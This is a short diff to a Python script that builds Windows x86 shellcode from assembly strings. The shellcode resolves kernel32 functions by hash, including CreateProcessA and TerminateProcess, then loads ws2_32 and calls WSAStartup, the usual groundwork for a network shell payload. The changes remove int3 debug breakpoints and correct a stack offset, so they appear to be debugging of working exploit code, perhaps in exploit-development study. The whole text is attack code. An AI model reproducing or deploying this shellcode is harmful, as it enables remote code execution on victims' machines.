@@ -81,9 +81,9 @@ def main():
     "   mov   [esp+0x1c], eax           ;"  #   Overwrite stack version of eax from pushad
 
     " find_function_finished:            "  #
+    "   int3                           ;"
     "   popad                           ;"  #   Restore registers
     "   ret                             ;"  #
-    "   int3                            ;"
                   
     " resolve_symbols_kernel32:          "
     "   push  0x78b5b983                ;"  #   TerminateProcess hash
@@ -95,7 +95,6 @@ def main():
     "   push  0x16b3fe72                ;"  #   CreateProcessA hash
     "   call dword ptr [ebp+0x04]       ;"  #   Call find_function
     "   mov   [ebp+0x18], eax           ;"  #   Save CreateProcessA address for later usage
-    "   int3                            ;"
 
     " load_ws2_32:                       "  #
     "   xor   eax, eax                  ;"  #   NULL EAX
@@ -120,7 +119,7 @@ def main():
 
     " call_wsastartup:                   "  #
     "   mov   eax, esp                  ;"  #   Move ESP to EAX
-    "   mov   cx, 0x48                 ;"  #   Move 0x590 to CX
+    "   mov   cx, 0x590                 ;"  #   Move 0x590 to CX
     "   sub   eax, ecx                  ;"  #   Substract CX from EAX to avoid overwriting the structure later
     "   push  eax                       ;"  #   Push lpWSAData
     "   xor   eax, eax                  ;"  #   NULL EAX
